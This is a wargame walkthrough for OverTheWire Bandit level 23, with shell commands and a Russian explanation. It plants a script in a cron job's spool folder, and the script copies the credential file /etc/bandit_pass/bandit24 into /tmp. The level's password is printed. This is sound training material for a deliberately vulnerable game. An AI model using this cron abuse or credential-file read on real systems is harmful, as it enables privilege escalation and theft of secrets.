# Bandit Level 23


bandit23@bandit:\~\$ cd /../../bin

bandit23@bandit:/bin\$ ls \| grep \"cron\"

cronjob_bandit22.sh

cronjob_bandit23.sh

cronjob_bandit24.sh

cronjob_behemoth4

cronjob_leviathan5

crontab

bandit23@bandit:/bin\$ cat cronjob_bandit24.sh

#!/bin/bash

 

myname=\$(whoami)

 

cd /var/spool/\$myname/foo

echo \"Executing and deleting all scripts in /var/spool/\$myname/foo:\"

for i in \* .\*;

do

if \[ \"\$i\" != \".\" -a \"\$i\" != \"..\" \];

then

echo \"Handling \$i\"

owner=\"\$(stat \--format \"%U\" ./\$i)\"

if \[ \"\${owner}\" = \"bandit23\" \]; then

timeout -s 9 60 ./\$i

fi

rm -f ./\$i

fi

done

 

bandit23@bandit:/bin\$

bandit23@bandit:\~\$ OUT=\"/tmp/p24.\$RANDOM\"

echo \"\$OUT\"

/tmp/p24.10015

bandit23@bandit:\~\$ cat \> /tmp/p.sh \<\<\'EOF\'

\> cat /etc/bandit_pass/bandit24 \> \_\_OUT\_\_

chmod 644 \_\_OUT\_\_

EOF

sed -i \"s#\_\_OUT\_\_#\$OUT#g\" /tmp/p.sh

chmod 755 /tmp/p.sh

bandit23@bandit:\~\$ cp -f /tmp/p.sh /var/spool/bandit24/foo/.z.sh

bandit23@bandit:\~\$ sleep 75

cat \"\$OUT\"

[gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8]{.mark}

bandit23@bandit:\~\$

пояснение

\# 1) Куда писать пароль (в корень /tmp, он 1777, всем доступен)

OUT=\"/tmp/p24.\$RANDOM\"

echo \"\$OUT\"

 

\# 2) собираем payload заранее со shebang

cat \> /tmp/p.sh \<\<\'EOF\'

#!/bin/bash

cat /etc/bandit_pass/bandit24 \> \_\_OUT\_\_

chmod 644 \_\_OUT\_\_

EOF

sed -i \"s#\_\_OUT\_\_#\$OUT#g\" /tmp/p.sh

chmod 755 /tmp/p.sh

 

\# 3) копируем готовый файл в очередь, где его подберёт cron (владелец сохранится bandit23)

cp -f /tmp/p.sh /var/spool/bandit24/foo/.z.sh

 

\# 4) ждем, пока cron отработает, и читаем результат

sleep 75

cat \"\$OUT\"

